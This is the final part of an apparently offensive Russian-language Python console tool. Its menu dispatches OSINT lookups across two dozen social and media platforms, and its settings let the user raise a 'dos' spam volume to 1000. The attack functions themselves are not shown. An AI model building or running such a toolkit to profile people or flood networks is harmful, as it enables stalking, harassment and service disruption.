                vk() if osintchoice1 == "1" else tiktok() if osintchoice1 == "2" else tg() if osintchoice1 == "3" else threads() if osintchoice1 == "4" else spotify() if osintchoice1 == "5" else youtube() if osintchoice1 == "6" else pornhub() if osintchoice1 == "7" else soundcloud() if osintchoice1 == "8" else reddit() if osintchoice1 == "9" else insta() if osintchoice1 == "10" else wa() if osintchoice1 == "11" else yamusic() if osintchoice1 == "12" else chess() if osintchoice1 == "13" else github() if osintchoice1 == "14" else twitch() if osintchoice1 == "15" else twitter() if osintchoice1 == "16" else discord() if osintchoice1 == "17" else duolingo() if osintchoice1 == "18" else roblox() if osintchoice1 == "19" else facebook() if osintchoice1 == "20" else kwork() if osintchoice1 == "21" else steam() if osintchoice1 == "22" else pinterest() if osintchoice1 == "23" else tumbrl() if osintchoice1 == "24" else all_services() if osintchoice1 == "nh" else vvoderr()
                input(f"\n{fcl}жми любую кнопку, чтоб выйти\n{inputc}")
                break
        elif snoschoice == "3":
            while True:
                printslow_slow(f'+------------------==={fch}INFORMATION{fcl}===-----------------+\n|  {fcl}создатель: @{fch}zevxs{fcl}i{fch}s{fcl}{" " * 31}|\n|  тг канал: @{fch}tembededd{fcl}{" " * 30}|\n|  github: {fch}z{fcl}e{fch}vx{fcl}syy{" "*35}|\n|  время писания {fch}v1{fcl}: {fch}11{fcl}h {fch}19{fcl}min{fcl}{" " * 23}|\n|  время писания {fch}v2{fcl}: {fch}6{fcl}h {fch}54{fcl}min{fcl}{" "*24}|\n|  короче барни, 0 ии. пользуйтесь на здоровье{" " * 7}|\n+----------------------------------------{fch}zevxsis{fcl}-----+\n')
                input(f"{fcl}жми любую кнопку, чтоб выйти\n{inputc}")
                break
        elif snoschoice == "4":
            while True:
                clear()
                printslow_fast(f'+------------=={fch}SETT{fcl}1{fch}NGS{fcl}==------------+\n|  1 - {fch}изменить цвет текста{fcl}{" "*10}|\n|  2 - {fch}изменить колво спама в dos{fcl}{" "*4}|\n| (может повлиять на работу роутера) |\n|  b - {fch}back{fcl}{" "*26}|\n+-------------------------{fch}zevxs{fcl}i{fch}s{fcl}----+\n\n')
                setchoice1 = input(inputc).strip()
                clear()
                if setchoice1 == "b":
                    break
                elif setchoice1 == "1":
                    printslow_fast(f"{fcl}1 - {colorama.Fore.RED}красный\n{fcl}2 - {colorama.Fore.GREEN}зеленый\n{fcl}3 - {colorama.Fore.YELLOW}желтый\n{fcl}4 - {colorama.Fore.BLUE}синий\n{fcl}5 - {colorama.Fore.MAGENTA}пурпурный\n{fcl}6 - {colorama.Fore.CYAN}голубой\n{fcl}7 - {colorama.Fore.WHITE}белый\n{fcl}8 - {colorama.Fore.LIGHTBLACK_EX}серый\n{fcl}9 - {colorama.Fore.LIGHTBLUE_EX}ярко синий\n{fcl}10 - {colorama.Fore.LIGHTCYAN_EX}ярко голубой\n{fcl}11 - {colorama.Fore.LIGHTGREEN_EX}ярко зеленый\n{fcl}12 - {colorama.Fore.LIGHTMAGENTA_EX}\n{fcl}13 - {colorama.Fore.LIGHTRED_EX}ярко красный\n{fcl}14 - {colorama.Fore.LIGHTYELLOW_EX}ярко желтый{fcl}\n\n")
                    try:
                        color = int(input(inputc))
                        colors = {
                            1: colorama.Fore.RED,
                            2: colorama.Fore.GREEN,
                            3: colorama.Fore.YELLOW,
                            4: colorama.Fore.BLUE,
                            5: colorama.Fore.MAGENTA,
                            6: colorama.Fore.CYAN,
                            7: colorama.Fore.WHITE,
                            8: colorama.Fore.LIGHTBLACK_EX,
                            9: colorama.Fore.LIGHTBLUE_EX,
                            10: colorama.Fore.LIGHTCYAN_EX,
                            11: colorama.Fore.LIGHTGREEN_EX,
                            12: colorama.Fore.LIGHTMAGENTA_EX,
                            13: colorama.Fore.LIGHTRED_EX,
                            14: colorama.Fore.LIGHTYELLOW_EX
                        }
                        if color in colors:
                            fch = colors[color]
                            inputc = f"{fcl}>{fch}>{fcl}> "
                        else: vvoderr()
                    except ValueError: vvoderr()
                elif setchoice1 == "2":
                    printslow_fast(f"введи количество {fch}спама в dos{fcl}\n{colorama.Fore.LIGHTBLACK_EX}мин 0 макс 1000{fcl}\n\n")
                    try:
                        setchoice3 = int(input(inputc))
                        clear()
                        if setchoice3 > 1000 or setchoice3 < 0:
                            vvoderr()
                        else:
                            cout = setchoice3
                            print(
                                f"{grebcard}успешно\nколво теперь: {cout}"
                            )
                            time.sleep(2)
                            break
                    except ValueError: vvoderr()
                else: vvoderr()
        else: vvoderr()
def boot():
    clear()
    log = f"-{colorama.Fore.LIGHTMAGENTA_EX}ZEVXSIS{fcl}-{colorama.Fore.LIGHTRED_EX}HEAD{fcl}-{colorama.Fore.LIGHTBLUE_EX}OF{fcl}-{colorama.Fore.LIGHTGREEN_EX}DEAD{fcl}"
    printslow_fast(f"{fch}{log*50}{fcl}")
    time.sleep(2)
    clear()
    printslow_fast(f"{fch}{art1}{fcl}")
    time.sleep(6)
    clear()
    main()
boot()
